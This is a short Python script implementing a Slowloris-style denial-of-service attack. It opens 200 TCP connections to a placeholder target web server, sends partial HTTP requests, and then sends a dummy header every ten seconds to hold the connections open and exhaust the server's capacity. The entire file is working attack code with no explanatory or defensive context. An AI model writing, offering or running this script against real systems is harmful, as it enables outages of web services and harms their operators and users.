import socket
import time

target_ip = "192.168.1.100"  # Replace with the target IP
target_port = 80  # Port to connect to
num_connections = 200  # Number of connections to open
connections = []

for _ in range(num_connections):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
    s.connect((target_ip, target_port))  # Connect to the server
    s.send(b"GET / HTTP/1.1\r\n")  # Send initial HTTP request
    connections.append(s)  # Store the socket

while True:
    for s in connections:
        try:
            s.send(b"X-a: b\r\n")  # Send a small amount of data to keep the connection alive
            time.sleep(10)  # Wait for 10 seconds before sending more data
        except Exception as e:
            connections.remove(s)  # Remove the socket if there's an error
